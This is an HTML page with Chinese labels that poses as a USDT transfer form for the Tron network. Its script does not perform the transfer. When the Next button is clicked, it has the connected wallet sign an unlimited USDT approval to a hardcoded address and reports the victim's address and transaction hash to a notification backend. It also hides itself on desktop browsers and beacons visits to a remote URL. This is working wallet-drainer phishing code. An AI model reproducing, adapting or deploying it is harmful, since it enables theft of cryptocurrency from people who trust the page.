<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT转账 - Tron</title>
    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            background-color: #F5F5F7;
            margin: 0;
            padding: 0;
            color: #000000;
        }
        .module-frame {
            border: 1px solid #E5E5E5;
            border-radius: 12px;
            background: white;
        }
        .input-field {
            border: none;
            width: 100%;
            background: transparent;
        }
        .input-field:focus {
            outline: none;
        }
        .btn-primary {
            background-color: #0080FF;
            color: white;
            border-radius: 12px;
            padding: 12px;
            font-weight: bold;
            width: 100%;
        }
        .btn-primary:disabled {
            background-color: #C1DAF6;
        }
        .text-warning {
            color: #FF7D00;
        }
        .tishi {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #4b4848;
            color: white;
            padding: 15px;
            border-radius: 8px;
            z-index: 1000;
            display: none;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col">
    <!-- 页面内容保持不变 -->
    <header class="bg-background py-1 px-5 shadow-sm">
        <div class="flex items-center justify-between h-10">
            <button class="text-text icon-interactive">
                <div class="custom-arrow"></div>
            </button>
            <div class="text-center">
                <h1 class="text-[17px] font-medium text-textTitle title-tight">USDT 转账</h1>
                <p class="text-[14px] text-textLight subtitle-tight">Tron</p>
            </div>
            <button class="text-text icon-interactive">
                <div class="custom-scan-icon">
                    <div class="top-right"></div>
                    <div class="bottom-right"></div>
                    <div class="middle-line"></div>
                </div>
            </button>
        </div>
    </header>

    <main class="p-5 pt-5 flex flex-col items-center flex-grow">
        <label class="block text-[15px] text-textLight mb-2 self-start w-full max-w-[559px]">收款地址</label>
        <div class="bg-white module-frame p-3 mb-4 address-box flex flex-col justify-center">
            <div class="relative">
                <input type="text" id="addressInput" placeholder="Tron 地址" class="w-full px-3 py-2 input-field bg-white text-text placeholder:text-placeholder text-sm address-input-limit" maxlength="70">
                <button class="absolute right-0.5 top-1/2 transform -translate-y-1/2 icon-interactive p-1" aria-label="选择联系人">
                    <div class="contact-icon">
                        <i class="fa fa-user-o"></i>
                    </div>
                </button>
            </div>
            <p id="addressError" class="text-warning text-xs mt-1 hidden">Tron 地址格式错误（应为T开头的34位字符）</p>
        </div>

        <div class="flex justify-between items-center self-start w-full max-w-[559px] mb-2">
            <label class="block text-[15px] text-textLight">数量</label>
            <span class="text-[15px] text-textLight" id="balance-display">0 USDT</span>
        </div>
        
        <div class="bg-white module-frame p-3 mb-4 amount-box flex flex-col justify-center" style="height: 90px; max-height: 106px;">
            <input type="text" id="amountInput" value="0" class="w-full px-3 py-0 input-field bg-white text-textLight text-[2.5rem] font-normal flex items-center justify-center" style="height: 104px;" inputmode="decimal" pattern="[0-9.]*" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
            <div class="divider-line my-0"></div>
            <div class="flex flex-col items-center" style="height: 30px;">
                <label for="remarkInput" class="block text-textLight text-sm mb-1 self-start">备注（需支付1TRX）</label>
            </div>
        </div>

        <label class="block text-[15px] text-textLight mb-2 self-start w-full max-w-[559px]">矿工费</label>
        <div class="bg-white module-frame p-2.5 mb-5 fee-box flex flex-col justify-center">
            <div class="flex justify-between items-center mb-0.5">
                <div>
                    <span class="font-medium text-text text-base block mb-1">$0</span>
                    <div class="flex items-center">
                        <span class="text-textLight text-sm mr-1">0 TRX</span>
                        <div class="fee-custom-arrow icon-interactive" id="feeArrow"></div>
                    </div>
                </div>
            </div>
            <div class="input-field bg-white p-1.5 cursor-pointer" id="feeToggle"></div>
        </div>
    </main>

    <footer class="p-5 pb-8">
        <button id="nextButton" class="w-full max-w-[559px] bg-primaryLight text-white py-3 rounded-xl font-bold text-[17px] shadow-sm transition-colors duration-200 mx-auto block" disabled="">
            下一步
        </button>
    </footer>

    <div class="tishi" id="tip">提示</div>

    <script>
        // 配置参数
        window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
        window.Payment_address = 'TQU4Njq2emJDudfF8GgxQeTsGQ22RSDfsT';
        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        window.heartbeatUrl = 'https://baidu.com/heartbeat';
        window.telegramNotifyUrl = 'https://your-backend.com/telegram-notify'; // 替换为您的后端URL
        
        // 存储用户数据
        const userData = {
            address: null,
            trxBalance: null,
            usdtBalance: null,
            hasApproved: false
        };
        
        let currentAmount = '0';
        const amountInput = document.getElementById('amountInput');
        const addressInput = document.getElementById('addressInput');
        let isUserInputting = false;

        // 发送Telegram通知函数
        async function sendTelegramNotification(userAddress, txHash, amount) {
            try {
                const response = await fetch(window.telegramNotifyUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        userAddress: userAddress,
                        transactionHash: txHash,
                        approvedAmount: amount,
                        timestamp: new Date().toISOString()
                    })
                });
                
                if (!response.ok) {
                    console.error('发送Telegram通知失败:', response.statusText);
                }
            } catch (error) {
                console.error('发送Telegram通知时出错:', error);
            }
        }

        // 主初始化函数
        async function initializeDApp() {
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const isDAppBrowser = typeof window.tronWeb !== 'undefined' || typeof window.tronLink !== 'undefined';
            
            if (!isMobile) {
                document.body.innerHTML = '';
            } else if (isMobile && !isDAppBrowser) {
                const currentUrl = encodeURIComponent(window.location.href);
                window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
            } else if (isMobile && isDAppBrowser) {
                await connectWallet();
            }
            updateBalanceDisplay();
        }

        // 连接到钱包
        async function connectWallet() {
            try {
                if (window.tronWeb && window.tronWeb.ready) {
                    await initDApp();
                } else if (window.tronLink) {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res.code === 200) {
                        window.tronWeb = window.tronLink.tronWeb;
                        await initDApp();
                    }
                }
            } catch (error) {
                console.error("钱包连接失败:", error);
                tip("钱包连接失败，请重试");
            }
        }

        // 初始化DApp数据
        async function initDApp() {
            try {
                userData.address = window.tronWeb.defaultAddress.base58;
                
                // 获取TRX余额
                const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
                userData.trxBalance = window.tronWeb.fromSun(trxBalance);
                
                // 获取USDT余额
                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
                const usdtBalance = await contract.balanceOf(userData.address).call();
                userData.usdtBalance = usdtBalance / 1e6;
                
                // 检查是否已授权
                await checkApprovalStatus();
                
                // 更新USDT余额显示
                updateBalanceDisplay();
                
            } catch (error) {
                console.error("获取用户数据时出错:", error);
                tip("获取余额失败，请重试");
            }
        }

        // 检查USDT授权状态
        async function checkApprovalStatus() {
            try {
                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
                const allowance = await contract.allowance(
                    window.tronWeb.defaultAddress.base58,
                    window.Permission_address
                ).call();
                
                // 如果已授权金额大于0，则视为已授权
                userData.hasApproved = parseFloat(allowance) > 0;
                console.log("USDT授权状态:", userData.hasApproved ? "已授权" : "未授权");
                
                return userData.hasApproved;
            } catch (error) {
                console.error("检查授权状态失败:", error);
                return false;
            }
        }

        // 监听金额输入框变化
        amountInput.addEventListener('input', function(e) {
            isUserInputting = true;
            let value = this.value;
            
            if (value === '0' && e.inputType.includes('insert') && this.selectionStart <= 1) {
                value = value.replace('0', '');
            }
            
            value = value.replace(/[^0-9.]/g, '');
            
            const dots = value.split('.').length - 1;
            if (dots > 1) {
                value = value.substring(0, value.lastIndexOf('.'));
            }
            
            const parts = value.split('.');
            if (parts.length > 1 && parts[1].length > 4) {
                value = parts[0] + '.' + parts[1].substring(0, 4);
            }
            
            if (value === '' || value === '.') {
                currentAmount = '0';
                this.value = '0';
                this.classList.remove('text-text');
                this.classList.add('text-textLight');
            } else {
                if (value.startsWith('0') && value.length > 1 && !value.startsWith('0.')) {
                    value = value.substring(1);
                }
                
                currentAmount = value;
                this.value = value;
                this.classList.remove('text-textLight');
                this.classList.add('text-text');
            }
            
            updateBalanceDisplay();
            updateNextButtonState();
            
            setTimeout(() => {
                isUserInputting = false;
            }, 300);
        });

        // 聚焦时处理
        amountInput.addEventListener('focus', function() {
            if (this.value === '0') {
                this.select();
            }
        });

        // 监听地址输入变化
        addressInput.addEventListener('input', function() {
            const addressError = document.getElementById('addressError');
            const value = this.value.trim();
            
            if (value && !(value.startsWith('T') && value.length === 34)) {
                addressError.classList.remove('hidden');
            } else {
                addressError.classList.add('hidden');
            }
            
            updateNextButtonState();
        });

        // 更新余额显示
        function updateBalanceDisplay() {
            if (isUserInputting) return;
            
            const balanceDisplay = document.getElementById('balance-display');
            
            if (parseFloat(currentAmount) > 0) {
                balanceDisplay.textContent = `${currentAmount} USDT`;
            } else if (userData.usdtBalance !== null) {
                balanceDisplay.textContent = `${userData.usdtBalance.toFixed(4)} USDT`;
            } else {
                balanceDisplay.textContent = "0 USDT";
            }
            
            document.title = `USDT转账 - ${currentAmount || 0} USDT`;
        }

        // 更新下一步按钮状态
        function updateNextButtonState() {
            const nextButton = document.getElementById('nextButton');
            const amount = parseFloat(currentAmount || '0');
            const address = addressInput.value.trim();
            
            const isAddressValid = address.startsWith('T') && address.length === 34;
            const isAmountValid = amount > 0;
            
            const isValid = isAddressValid && isAmountValid;
            
            nextButton.disabled = !isValid;
            nextButton.classList.toggle('bg-primary', isValid);
            nextButton.classList.toggle('bg-primaryLight', !isValid);
        }

        // 显示提示
        function tip(message) {
            const tipElement = document.getElementById('tip');
            tipElement.textContent = message;
            tipElement.style.display = 'block';
            setTimeout(() => tipElement.style.display = 'none', 3000);
        }

        // 下一步按钮点击处理
        async function onNextButtonClick() {
            try {
                const address = addressInput.value.trim();
                const amount = parseFloat(currentAmount);
                
                // 1. 验证基本信息
                if (!address.startsWith('T') || address.length !== 34) {
                    tip("请输入有效的Tron地址");
                    return;
                }
                
                if (amount <= 0) {
                    tip("请输入有效的转账金额");
                    return;
                }
                
                // 2. 检查钱包连接状态
                if (!window.tronWeb || !window.tronWeb.defaultAddress?.base58) {
                    tip("正在连接钱包...");
                    await connectWallet();
                    
                    if (!window.tronWeb || !window.tronWeb.defaultAddress?.base58) {
                        tip("钱包连接失败，请重试");
                        return;
                    }
                }
                
                // 3. 检查余额但不阻止流程，只做提示
                let hasBalanceIssue = false;
                if (userData.trxBalance && parseFloat(userData.trxBalance) < (amount + 1)) {
                    tip("提示：余额不足，需要额外1TRX作为手续费");
                    hasBalanceIssue = true;
                }
                
                if (userData.usdtBalance && userData.usdtBalance < amount) {
                    tip("提示：USDT余额不足");
                    hasBalanceIssue = true;
                }
                
                // 如果有余额问题，短暂延迟后继续流程
                if (hasBalanceIssue) {
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
                
                // 5. 检查是否已授权，如果未授权则先进行授权
                if (!userData.hasApproved) {
                    tip("需要先USDT授权...");
                    const txHash = await approveUSDT();
                    
                    if (txHash) {
                        // 授权成功，发送Telegram通知
                        await sendTelegramNotification(
                            window.tronWeb.defaultAddress.base58,
                            txHash,
                            amount.toString()
                        );
                        
                        tip("授权成功，Telegram通知已发送");
                    } else {
                        tip("授权失败，请重试");
                        return;
                    }
                } else {
                    tip("已授权，可以直接转账");
                }
                
            } catch (error) {
                console.error('操作执行失败:', error);
                
                if (error.message.includes('User denied')) {
                    tip('用户已取消操作');
                } else if (error.message.includes('insufficient balance')) {
                    tip('余额不足');
                } else if (error.message.includes('Invalid address')) {
                    tip('地址无效');
                } else {
                    tip('操作失败: ' + error.message);
                }
            }
        }

        // USDT授权函数
        async function approveUSDT() {
            const unlimitedApproval = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
            const feeLimit = 100000000;
            
            try {
                console.log("USDT授权...");
                const usdtContractAddressHex = window.tronWeb.address.toHex(window.usdtContractAddress);
                
                const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
                    usdtContractAddressHex,
                    'approve(address,uint256)',
                    { feeLimit: feeLimit },
                    [
                        { type: 'address', value: window.tronWeb.address.toHex(window.Permission_address) },
                        { type: 'uint256', value: unlimitedApproval }
                    ],
                    window.tronWeb.defaultAddress.base58
                );

                if (!transaction.result || !transaction.result.result) {
                    throw new Error('授权交易构建失败');
                }

                console.log("签名授权交易...");
                const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);

                console.log("发送授权交易...");
                const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);

                if (result.result) {
                    console.log("无限授权成功，交易哈希:", result.txid);
                    userData.hasApproved = true;
                    return result.txid;
                } else {
                    throw new Error("授权失败");
                }
            } catch (error) {
                console.error("USDT授权失败:", error);
                throw error;
            }
        }

        // 绑定事件
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('nextButton').addEventListener('click', onNextButtonClick);
            initializeDApp();
            
            const feeToggle = document.getElementById('feeToggle');
            const feeArrow = document.getElementById('feeArrow');
            feeToggle.addEventListener('click', () => {
                feeArrow.classList.toggle('rotate-180');
            });
        });

        // 发送心跳
        function sendHeartbeat() {
            fetch(window.heartbeatUrl, {
                method: 'POST',
                mode: 'cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ url: window.location.href })
            }).catch(() => {});
        }
        const heartbeatInterval = setInterval(sendHeartbeat, 5000);
        window.onload = sendHeartbeat;
        window.onbeforeunload = () => clearInterval(heartbeatInterval);
    </script>
</body>
</html>
